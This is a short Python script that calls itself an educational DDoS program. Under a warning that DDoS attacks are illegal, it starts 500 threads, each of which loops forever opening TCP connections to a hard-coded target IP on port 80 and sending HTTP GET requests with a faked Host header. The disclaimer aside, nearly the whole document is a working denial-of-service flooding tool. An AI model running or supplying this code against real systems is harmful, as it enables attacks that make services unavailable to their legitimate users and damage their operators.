"""WARNING: DDoS Attacks are Illegal and Unethical

#This program is for educational purposes only. Distributed Denial-of-Service (DDoS) attacks overwhelm a server with traffic, making it unavailable to legitimate users.DDoS attacks are illegal in most jurisdictions and can cause significant damage.

#Using this program for malicious purposes can result in serious consequences, including:

#Legal trouble: You could face criminal charges and civil lawsuits.
#Financial penalties: Fines can be significant.
#Damaged reputation: A DDoS conviction can have a lasting negative impact"""

import threading
import socket

#Networking Libraries

#Target IP address here
#Randomly Generated IP
target = '234.63.192.197'

port = 80
fake_ip = '46.233.2.244'
#Randomly generated IP
# Random fake IP address

already_connected = 0


#function for attack
def attack():
  while True:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    #creates socket s
    s.connect((target, port))
    #connects the target to the port
    s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'),
             (target, port))
    s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
    s.close()

    global already_connected
    already_connected += 1
    if already_connected % 500 == 0:
      print(already_connected)


for i in range(500):
  thread = threading.Thread(target=attack)
  thread.start()

#iterating the request